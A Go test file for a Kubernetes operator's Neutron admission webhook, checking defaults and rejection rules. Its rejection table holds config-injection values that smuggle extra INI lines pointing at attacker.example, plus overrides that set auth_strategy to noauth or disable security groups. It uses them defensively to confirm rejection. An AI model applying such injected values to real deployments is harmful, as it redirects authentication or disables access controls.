// SPDX-FileCopyrightText: Copyright 2026 SAP SE or an SAP affiliate company
//
// SPDX-License-Identifier: Apache-2.0

package v1alpha1

import (
	"context"
	"strings"
	"testing"

	"github.com/onsi/gomega"
	corev1 "k8s.io/api/core/v1"
	schedulingv1 "k8s.io/api/scheduling/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	clientgoscheme "k8s.io/client-go/kubernetes/scheme"
	"k8s.io/utils/ptr"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"

	commonv1 "github.com/c5c3/cobaltcore/internal/common/types"
)

// validNeutron returns a minimal Neutron CR that passes every validation rule.
// Tests mutate single fields to exercise individual rules.
func validNeutron() *Neutron {
	return &Neutron{
		ObjectMeta: metav1.ObjectMeta{Name: "test-neutron", Namespace: "openstack"},
		Spec: NeutronSpec{
			OpenStackRelease: "2025.2",
			Deployment:       DeploymentSpec{Replicas: 3},
			Image: commonv1.ImageSpec{
				Repository: "ghcr.io/c5c3/neutron",
				Tag:        "2025.2",
			},
			Database: commonv1.DatabaseSpec{
				ClusterRef: &corev1.LocalObjectReference{Name: "mariadb"},
			},
			Cache: commonv1.CacheSpec{
				ClusterRef: &corev1.LocalObjectReference{Name: "memcached"},
				Backend:    commonv1.DefaultCacheBackend,
			},
			KeystoneEndpoint: "http://keystone.openstack.svc.cluster.local:5000/v3",
			ServiceUser: ServiceUserSpec{
				SecretRef: commonv1.SecretRefSpec{Name: "neutron-service-password", Key: "password"},
			},
			Workers: WorkersSpec{Deployment: commonv1.DeploymentSpec{Replicas: 3}},
			Messaging: commonv1.MessagingSpec{
				ClusterRef: &corev1.LocalObjectReference{Name: "rabbitmq"},
			},
			OVN: OVNSpec{CentralRef: OVNCentralRef{Name: "ovn", Namespace: "openstack"}},
		},
	}
}

// newFakeClient builds a client.Reader for the cluster-scoped admission lookups
// (PriorityClass existence), seeded with the given objects.
func newFakeClient(objs ...runtime.Object) *fake.ClientBuilder {
	s := runtime.NewScheme()
	_ = clientgoscheme.AddToScheme(s)
	b := fake.NewClientBuilder().WithScheme(s)
	for _, o := range objs {
		b = b.WithRuntimeObjects(o)
	}
	return b
}

// --- Defaulting webhook ---

func TestNeutronDefault_MaterializesServiceUserLoggingAndBothDeployments(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	// Start from a CR whose service-user identity fields and secretRef key are
	// empty so the defaulter has to fill all five, and whose two Deployment blocks
	// carry nothing at all.
	obj := validNeutron()
	obj.Spec.ServiceUser = ServiceUserSpec{SecretRef: commonv1.SecretRefSpec{Name: "neutron-service-password"}}
	obj.Spec.Cache.Backend = ""
	obj.Spec.Deployment = DeploymentSpec{}
	obj.Spec.Workers = WorkersSpec{}

	g.Expect(w.Default(context.Background(), obj)).To(gomega.Succeed())

	g.Expect(obj.Spec.ServiceUser.Username).To(gomega.Equal("neutron"))
	g.Expect(obj.Spec.ServiceUser.ProjectName).To(gomega.Equal("service"))
	g.Expect(obj.Spec.ServiceUser.UserDomainName).To(gomega.Equal("Default"))
	g.Expect(obj.Spec.ServiceUser.ProjectDomainName).To(gomega.Equal("Default"))
	g.Expect(obj.Spec.ServiceUser.SecretRef.Key).To(gomega.Equal("password"))

	// The shared block defaults come along too, for the API pods and for the RPC
	// workers: a zero worker replica count would scale that Deployment to nothing.
	g.Expect(obj.Spec.Deployment.Replicas).To(gomega.Equal(commonv1.DefaultReplicas))
	g.Expect(obj.Spec.Deployment.Resources).NotTo(gomega.BeNil())
	g.Expect(obj.Spec.Workers.Deployment.Replicas).To(gomega.Equal(commonv1.DefaultReplicas))
	g.Expect(obj.Spec.Workers.Deployment.Resources).NotTo(gomega.BeNil())
	g.Expect(obj.Spec.Cache.Backend).To(gomega.Equal(commonv1.DefaultCacheBackend))
	g.Expect(obj.Spec.Logging).NotTo(gomega.BeNil())
	g.Expect(obj.Spec.Logging.Format).To(gomega.Equal("text"))
	g.Expect(obj.Spec.Logging.Level).To(gomega.Equal("INFO"))
}

// The OVN control plane is resolved by name and namespace. An omitted namespace
// means "this CR's namespace", and it is materialized rather than resolved at
// reconcile time so the CR records which namespace was meant.
func TestNeutronDefault_OVNCentralRefNamespace(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	empty := validNeutron()
	empty.Spec.OVN.CentralRef.Namespace = ""
	g.Expect(w.Default(context.Background(), empty)).To(gomega.Succeed())
	g.Expect(empty.Spec.OVN.CentralRef.Namespace).To(gomega.Equal("openstack"))

	explicit := validNeutron()
	explicit.Spec.OVN.CentralRef.Namespace = "ovn-system"
	g.Expect(w.Default(context.Background(), explicit)).To(gomega.Succeed())
	g.Expect(explicit.Spec.OVN.CentralRef.Namespace).To(gomega.Equal("ovn-system"),
		"an explicit namespace must not be clobbered")
}

// Both messaging Secret keys are filled only for the halves the CR carries: a
// managed clusterRef has no secretRef to key, and a plaintext connection has no
// CA bundle.
func TestNeutronDefault_MessagingSecretKeys(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	brownfield := validNeutron()
	brownfield.Spec.Messaging = commonv1.MessagingSpec{
		SecretRef: &commonv1.SecretRefSpec{Name: "neutron-transport-url"},
		TLS:       &commonv1.MessagingTLSSpec{CABundleSecretRef: commonv1.SecretRefSpec{Name: "rabbitmq-ca"}},
	}
	g.Expect(w.Default(context.Background(), brownfield)).To(gomega.Succeed())
	g.Expect(brownfield.Spec.Messaging.SecretRef.Key).To(gomega.Equal(commonv1.DefaultTransportURLSecretKey))
	g.Expect(brownfield.Spec.Messaging.TLS.CABundleSecretRef.Key).To(gomega.Equal("ca.crt"))

	explicit := validNeutron()
	explicit.Spec.Messaging = commonv1.MessagingSpec{
		SecretRef: &commonv1.SecretRefSpec{Name: "neutron-transport-url", Key: "url"},
		TLS:       &commonv1.MessagingTLSSpec{CABundleSecretRef: commonv1.SecretRefSpec{Name: "rabbitmq-ca", Key: "bundle.pem"}},
	}
	g.Expect(w.Default(context.Background(), explicit)).To(gomega.Succeed())
	g.Expect(explicit.Spec.Messaging.SecretRef.Key).To(gomega.Equal("url"))
	g.Expect(explicit.Spec.Messaging.TLS.CABundleSecretRef.Key).To(gomega.Equal("bundle.pem"))

	managed := validNeutron()
	g.Expect(w.Default(context.Background(), managed)).To(gomega.Succeed())
	g.Expect(managed.Spec.Messaging.SecretRef).To(gomega.BeNil())
	g.Expect(managed.Spec.Messaging.TLS).To(gomega.BeNil())
}

// A nil spec.ovnDBSync means no CronJob at all, so admission must leave it nil:
// materializing an empty block would schedule a sync nobody asked for.
func TestNeutronDefault_LeavesOVNDBSyncUnset(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	obj := validNeutron()
	g.Expect(w.Default(context.Background(), obj)).To(gomega.Succeed())
	g.Expect(obj.Spec.OVNDBSync).To(gomega.BeNil())
}

// --- Validating webhook ---

func TestNeutronValidateCreate_ValidSpecAccepted(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	_, err := w.ValidateCreate(context.Background(), validNeutron())
	g.Expect(err).NotTo(gomega.HaveOccurred())
}

func TestNeutronValidateCreate_RejectionTable(t *testing.T) {
	tests := []struct {
		name    string
		mutate  func(o *Neutron)
		wantSub string
	}{
		{
			name:    "zero replicas rejected",
			mutate:  func(o *Neutron) { o.Spec.Deployment.Replicas = 0 },
			wantSub: "replicas must be at least 1",
		},
		{
			name: "image tag and digest both set rejected",
			mutate: func(o *Neutron) {
				o.Spec.Image.Digest = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
			},
			wantSub: "exactly one of image.tag or image.digest",
		},
		{
			name:    "database clusterRef and host both set rejected",
			mutate:  func(o *Neutron) { o.Spec.Database.Host = "mariadb.example.com" },
			wantSub: "exactly one of clusterRef or host",
		},
		{
			name: "dynamic credentials without clusterRef rejected",
			mutate: func(o *Neutron) {
				o.Spec.Database.ClusterRef = nil
				o.Spec.Database.Host = "mariadb.example.com"
				o.Spec.Database.CredentialsMode = commonv1.CredentialsModeDynamic
			},
			wantSub: "credentialsMode Dynamic requires clusterRef",
		},
		{
			name:    "cache clusterRef and servers both set rejected",
			mutate:  func(o *Neutron) { o.Spec.Cache.Servers = []string{"memcached-0:11211"} },
			wantSub: "exactly one of clusterRef or servers",
		},
		// Both cache shapes land in [keystone_authtoken].memcached_servers via
		// cache.ResolveServers, which the INI renderer writes verbatim. A newline
		// appends a second auth_url to that section and oslo.config keeps the last
		// value for a non-multi option, so keystonemiddleware would validate every
		// incoming token against an attacker-controlled Keystone.
		{
			name: "cache server with a newline rejected",
			mutate: func(o *Neutron) {
				o.Spec.Cache.ClusterRef = nil
				o.Spec.Cache.Servers = []string{"memcached-0:11211\nauth_url = http://attacker.example/v3"}
			},
			wantSub: "must not contain a newline or carriage return",
		},
		{
			name:    "serviceUser username with a newline rejected",
			mutate:  func(o *Neutron) { o.Spec.ServiceUser.Username = "neutron\npassword = hunter2" },
			wantSub: "must not contain a newline or carriage return",
		},
		// centralRef.name and .namespace are resolved into the [ovn] connection
		// strings, which the renderer writes verbatim.
		{
			name: "centralRef name with a newline rejected",
			mutate: func(o *Neutron) {
				o.Spec.OVN.CentralRef.Name = "ovn\novn_nb_connection = tcp:attacker.example:6641"
			},
			wantSub: "must not contain a newline or carriage return",
		},
		{
			name: "both messaging modes set rejected",
			mutate: func(o *Neutron) {
				o.Spec.Messaging.SecretRef = &commonv1.SecretRefSpec{Name: "neutron-transport-url"}
			},
			wantSub: "exactly one of clusterRef or secretRef must be set",
		},
		{
			name:    "neither messaging mode set rejected",
			mutate:  func(o *Neutron) { o.Spec.Messaging = commonv1.MessagingSpec{} },
			wantSub: "exactly one of clusterRef or secretRef must be set",
		},
		{
			name: "messaging tls without a CA bundle name rejected",
			mutate: func(o *Neutron) {
				o.Spec.Messaging.TLS = &commonv1.MessagingTLSSpec{}
			},
			wantSub: "caBundleSecretRef.name must be set when spec.messaging.tls is configured",
		},
		{
			name:    "empty ovn centralRef name rejected",
			mutate:  func(o *Neutron) { o.Spec.OVN.CentralRef.Name = "" },
			wantSub: "centralRef.name must be set",
		},
		{
			name:    "unknown ovnDBSync syncMode rejected",
			mutate:  func(o *Neutron) { o.Spec.OVNDBSync = &OVNDBSyncSpec{SyncMode: "wipe"} },
			wantSub: "spec.ovnDBSync.syncMode",
		},
		{
			name:    "empty keystoneEndpoint rejected",
			mutate:  func(o *Neutron) { o.Spec.KeystoneEndpoint = "" },
			wantSub: "keystoneEndpoint must be set",
		},
		{
			name:    "keystoneEndpoint without a host rejected",
			mutate:  func(o *Neutron) { o.Spec.KeystoneEndpoint = "http:///v3" },
			wantSub: "URL must include a host",
		},
		{
			name:    "unknown logging level rejected",
			mutate:  func(o *Neutron) { o.Spec.Logging = &LoggingSpec{Level: "TRACE"} },
			wantSub: "spec.logging.level",
		},
		{
			name: "invalid secretStoreRef kind rejected",
			mutate: func(o *Neutron) {
				o.Spec.SecretStoreRef = &commonv1.SecretStoreRefSpec{Name: "openbao", Kind: "Vault"}
			},
			wantSub: "spec.secretStoreRef.kind",
		},
		{
			name: "topologySpreadConstraints with a foreign selector rejected",
			mutate: func(o *Neutron) {
				o.Spec.Deployment.TopologySpreadConstraints = []corev1.TopologySpreadConstraint{{
					MaxSkew:           1,
					TopologyKey:       "kubernetes.io/hostname",
					WhenUnsatisfiable: corev1.DoNotSchedule,
					LabelSelector: &metav1.LabelSelector{
						MatchLabels: map[string]string{"app": "neutron"},
					},
				}}
			},
			wantSub: "labelSelector.matchLabels must equal the Deployment selector labels",
		},
		// The connection string points the mechanism driver at a Northbound
		// database. Rendering an override would have it rewrite a logical model it
		// does not own, before the ExtraConfigHealthy condition could surface it.
		{
			name: "rejected owned key in extraConfig",
			mutate: func(o *Neutron) {
				o.Spec.ExtraConfig = map[string]map[string]string{
					"ovn": {"ovn_nb_connection": "tcp:attacker.example:6641"},
				}
			},
			wantSub: "ovn_nb_connection is managed via",
		},
		// auth_strategy selects the WSGI pipeline: anything but keystone serves the
		// whole API without token validation from the moment the pods load the file.
		{
			name: "rejected auth_strategy in extraConfig",
			mutate: func(o *Neutron) {
				o.Spec.ExtraConfig = map[string]map[string]string{
					"DEFAULT": {"auth_strategy": "noauth"},
				}
			},
			wantSub: "auth_strategy is managed via",
		},
		// enable_security_group is what makes the mechanism driver program the OVN
		// ACLs a port's security groups describe.
		{
			name: "rejected enable_security_group in extraConfig",
			mutate: func(o *Neutron) {
				o.Spec.ExtraConfig = map[string]map[string]string{
					"securitygroup": {"enable_security_group": "false"},
				}
			},
			wantSub: "enable_security_group is managed via",
		},
		{
			name: "extraConfig value with a newline rejected",
			mutate: func(o *Neutron) {
				o.Spec.ExtraConfig = map[string]map[string]string{
					"DEFAULT": {"debug": "true\n[ovn]\novn_nb_connection = tcp:attacker.example:6641"},
				}
			},
			wantSub: "extraConfig key and value must not contain a newline or carriage return",
		},
		{
			name: "empty extraConfig section name rejected",
			mutate: func(o *Neutron) {
				o.Spec.ExtraConfig = map[string]map[string]string{"": {"debug": "true"}}
			},
			wantSub: "extraConfig section name must not be empty",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			g := gomega.NewWithT(t)
			w := &NeutronWebhook{}

			obj := validNeutron()
			tc.mutate(obj)
			_, err := w.ValidateCreate(context.Background(), obj)
			g.Expect(err).To(gomega.HaveOccurred())
			g.Expect(err.Error()).To(gomega.ContainSubstring(tc.wantSub))
		})
	}
}

// The cron grammar is the one ovnDBSync rule with no schema counterpart: the
// field accepts descriptors such as @daily, which no CRD pattern expresses
// without also rejecting valid expressions. The parse error travels into the
// message so the author sees which field of the expression is wrong.
func TestNeutronValidate_OVNDBSyncScheduleGrammar(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	bad := validNeutron()
	bad.Spec.OVNDBSync = &OVNDBSyncSpec{Schedule: "x y"}
	_, err := w.ValidateCreate(context.Background(), bad)
	g.Expect(err).To(gomega.HaveOccurred())
	g.Expect(err.Error()).To(gomega.ContainSubstring("invalid cron expression"))

	// A descriptor and a five-field expression are both accepted, and so is an
	// empty schedule (the operator resolves DefaultOVNDBSyncSchedule at reconcile
	// time).
	for _, schedule := range []string{"", "@daily", DefaultOVNDBSyncSchedule} {
		ok := validNeutron()
		ok.Spec.OVNDBSync = &OVNDBSyncSpec{Schedule: schedule, SyncMode: DefaultOVNDBSyncMode}
		_, err := w.ValidateCreate(context.Background(), ok)
		g.Expect(err).NotTo(gomega.HaveOccurred(), "schedule %q must be accepted", schedule)
	}
}

// metadata.name is bounded by the child object with the tightest name budget, the
// "{name}-ovn-db-sync" CronJob. Nothing else in the CRD or the webhook bounds it,
// so without this rule a name the API server would refuse as a CronJob admits
// cleanly.
func TestNeutronValidateCreate_NameLengthBoundedByOVNDBSyncCronJob(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	g.Expect(MaxNeutronNameLength).To(gomega.Equal(40))

	atLimit := validNeutron()
	atLimit.Name = strings.Repeat("n", MaxNeutronNameLength)
	_, err := w.ValidateCreate(context.Background(), atLimit)
	g.Expect(err).NotTo(gomega.HaveOccurred(),
		"a name that still fits the 52-character CronJob budget must be accepted")

	tooLong := validNeutron()
	tooLong.Name = strings.Repeat("n", MaxNeutronNameLength+1)
	_, err = w.ValidateCreate(context.Background(), tooLong)
	g.Expect(err).To(gomega.MatchError(gomega.ContainSubstring("metadata.name")))
	g.Expect(err).To(gomega.MatchError(gomega.ContainSubstring("ovn-db-sync")))
}

// The bound is create-only. metadata.name is immutable, so on update it could
// only ever fire against a CR a pre-upgrade operator already admitted — and the
// validating webhook registers the update verb, so it also sees the
// finalizer-removal update reconcileDelete issues. Rejecting that would wedge the
// grandfathered CR in Terminating forever, with no field left to edit to repair
// it.
func TestNeutronValidateUpdate_OverlongNameStaysUpdatable(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	grandfathered := validNeutron()
	grandfathered.Name = strings.Repeat("n", MaxNeutronNameLength+1)
	grandfathered.Finalizers = []string{"neutron.openstack.c5c3.io/finalizer"}

	deleting := grandfathered.DeepCopy()
	deleting.Finalizers = nil

	_, err := w.ValidateUpdate(context.Background(), grandfathered, deleting)
	g.Expect(err).NotTo(gomega.HaveOccurred(),
		"an over-long grandfathered CR must stay updatable, or its deletion never completes")
}

func TestNeutronValidateCreate_MissingPriorityClassRejected(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{Client: newFakeClient().Build()}
	obj := validNeutron()
	obj.Spec.Deployment.PriorityClassName = ptr.To("nonexistent-class")

	_, err := w.ValidateCreate(context.Background(), obj)
	g.Expect(err).To(gomega.MatchError(gomega.ContainSubstring("priorityClassName")))
	g.Expect(err).To(gomega.MatchError(gomega.ContainSubstring("nonexistent-class")))
}

func TestNeutronValidateCreate_ExistingPriorityClassAccepted(t *testing.T) {
	g := gomega.NewWithT(t)
	pc := &schedulingv1.PriorityClass{
		ObjectMeta: metav1.ObjectMeta{Name: "system-cluster-critical"},
		Value:      1000000,
	}
	w := &NeutronWebhook{Client: newFakeClient(pc).Build()}
	obj := validNeutron()
	obj.Spec.Deployment.PriorityClassName = ptr.To("system-cluster-critical")

	_, err := w.ValidateCreate(context.Background(), obj)
	g.Expect(err).NotTo(gomega.HaveOccurred())
}

// --- spec.extraConfig option catalog ---

func TestNeutronValidate_ExtraConfigUnknownOptionRejected(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	obj := validNeutron()
	obj.Spec.ExtraConfig = map[string]map[string]string{
		"ml2": {"not_an_option": "x"},
	}
	_, err := w.ValidateCreate(context.Background(), obj)
	g.Expect(err).To(gomega.HaveOccurred())
	g.Expect(err.Error()).To(gomega.ContainSubstring("no such option in the neutron 2025.2 option catalog"))
}

func TestNeutronValidate_ExtraConfigUnknownSectionRejected(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	obj := validNeutron()
	obj.Spec.ExtraConfig = map[string]map[string]string{
		"not_a_section": {"host": "example.com"},
	}
	_, err := w.ValidateCreate(context.Background(), obj)
	g.Expect(err).To(gomega.HaveOccurred())
	g.Expect(err.Error()).To(gomega.ContainSubstring("no such section in the neutron 2025.2 option catalog"))
}

// The catalog is the flat union of the three generator files, so an option of the
// metadata agent's own file passes on the API kind. oslo.config ignores it at
// runtime.
func TestNeutronValidate_ExtraConfigAcceptsAgentSection(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	obj := validNeutron()
	obj.Spec.ExtraConfig = map[string]map[string]string{
		"ovs": {"ovsdb_timeout": "10"},
	}
	_, err := w.ValidateCreate(context.Background(), obj)
	g.Expect(err).NotTo(gomega.HaveOccurred())
}

// A release the build ships no catalog for must not block admission: the check
// fails open with exactly one warning, and the two misses are distinguishable.
func TestNeutronValidate_ExtraConfigFailsOpenWithoutCatalog(t *testing.T) {
	tests := []struct {
		name    string
		release string
		wantSub string
	}{
		{
			name:    "unparseable release",
			release: "latest",
			wantSub: "spec.openStackRelease does not name an OpenStack release",
		},
		{
			name:    "release with no embedded catalog",
			release: "2024.2",
			wantSub: `no catalog for release "2024.2" is embedded in this operator build`,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			g := gomega.NewWithT(t)
			w := &NeutronWebhook{}

			obj := validNeutron()
			obj.Spec.OpenStackRelease = tc.release
			// An option no catalog carries: with a catalog resolved this would be a
			// rejection, so the acceptance below is attributable to the fail-open path.
			obj.Spec.ExtraConfig = map[string]map[string]string{
				"ml2": {"not_an_option": "x"},
			}

			warnings, err := w.ValidateCreate(context.Background(), obj)
			g.Expect(err).NotTo(gomega.HaveOccurred())
			g.Expect(warnings).To(gomega.ConsistOf(gomega.ContainSubstring(tc.wantSub)))
		})
	}
}

// The catalog check is re-run on update only when one of its inputs changed, so a
// CR whose extraConfig went stale-invalid against a regenerated catalog stays
// editable through every other field.
func TestNeutronValidateUpdate_ExtraConfigCatalogGate(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}

	stale := validNeutron()
	stale.Spec.ExtraConfig = map[string]map[string]string{
		"ml2": {"not_an_option": "x"},
	}

	// Editing an unrelated field leaves the catalog check unrun.
	scaled := stale.DeepCopy()
	scaled.Spec.Deployment.Replicas = 5
	_, err := w.ValidateUpdate(context.Background(), stale, scaled)
	g.Expect(err).NotTo(gomega.HaveOccurred())

	// Touching extraConfig itself runs it again.
	edited := stale.DeepCopy()
	edited.Spec.ExtraConfig = map[string]map[string]string{
		"ml2": {"still_not_an_option": "x"},
	}
	_, err = w.ValidateUpdate(context.Background(), stale, edited)
	g.Expect(err).To(gomega.HaveOccurred())
	g.Expect(err.Error()).To(gomega.ContainSubstring("no such option in the neutron 2025.2 option catalog"))
}

// --- spec.targetClusterRef (multicluster routing) ---

// TestNeutronValidateUpdate_TargetClusterRefAddedRejected covers the presence
// flip upwards: the children of a CR created without a target cluster live on
// the management cluster, so naming one afterwards is rejected.
func TestNeutronValidateUpdate_TargetClusterRefAddedRejected(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}
	old := validNeutron()
	newObj := validNeutron()
	newObj.Spec.TargetClusterRef = &commonv1.TargetClusterRefSpec{Name: "edge-1"}

	_, err := w.ValidateUpdate(context.Background(), old, newObj)
	g.Expect(err).To(gomega.HaveOccurred())
	g.Expect(err.Error()).To(gomega.ContainSubstring("targetClusterRef is immutable"))
}

// TestNeutronValidateUpdate_TargetClusterRefRemovedRejected covers the presence
// flip downwards: dropping the ref would strand the children on the cluster it
// named.
func TestNeutronValidateUpdate_TargetClusterRefRemovedRejected(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}
	old := validNeutron()
	old.Spec.TargetClusterRef = &commonv1.TargetClusterRefSpec{Name: "edge-1"}
	newObj := validNeutron()

	_, err := w.ValidateUpdate(context.Background(), old, newObj)
	g.Expect(err).To(gomega.HaveOccurred())
	g.Expect(err.Error()).To(gomega.ContainSubstring("targetClusterRef is immutable"))
}

// TestNeutronValidateUpdate_TargetClusterRefChangedRejected covers a rename,
// which would re-point the reconciler at a cluster that holds none of the
// children.
func TestNeutronValidateUpdate_TargetClusterRefChangedRejected(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}
	old := validNeutron()
	old.Spec.TargetClusterRef = &commonv1.TargetClusterRefSpec{Name: "edge-1"}
	newObj := validNeutron()
	newObj.Spec.TargetClusterRef = &commonv1.TargetClusterRefSpec{Name: "edge-2"}

	_, err := w.ValidateUpdate(context.Background(), old, newObj)
	g.Expect(err).To(gomega.HaveOccurred())
	g.Expect(err.Error()).To(gomega.ContainSubstring("targetClusterRef is immutable"))
}

// TestNeutronValidateUpdate_TargetClusterRefUnchangedAccepted proves the check
// freezes only the ref: an unrelated edit on a CR that names a target cluster
// still passes.
func TestNeutronValidateUpdate_TargetClusterRefUnchangedAccepted(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}
	old := validNeutron()
	old.Spec.TargetClusterRef = &commonv1.TargetClusterRefSpec{Name: "edge-1"}
	newObj := old.DeepCopy()
	newObj.Spec.Deployment.Replicas = 2

	_, err := w.ValidateUpdate(context.Background(), old, newObj)
	g.Expect(err).NotTo(gomega.HaveOccurred())
}

// TestNeutronValidateCreate_EmptyTargetClusterRefNameRejected is the
// defense-in-depth twin of the MinLength marker: a present ref must name a
// cluster.
func TestNeutronValidateCreate_EmptyTargetClusterRefNameRejected(t *testing.T) {
	g := gomega.NewWithT(t)
	w := &NeutronWebhook{}
	obj := validNeutron()
	obj.Spec.TargetClusterRef = &commonv1.TargetClusterRefSpec{Name: ""}

	_, err := w.ValidateCreate(context.Background(), obj)
	g.Expect(err).To(gomega.HaveOccurred())
	g.Expect(err.Error()).To(gomega.ContainSubstring("targetClusterRef.name"))
	g.Expect(err.Error()).To(gomega.ContainSubstring("target cluster name must be set"))
}
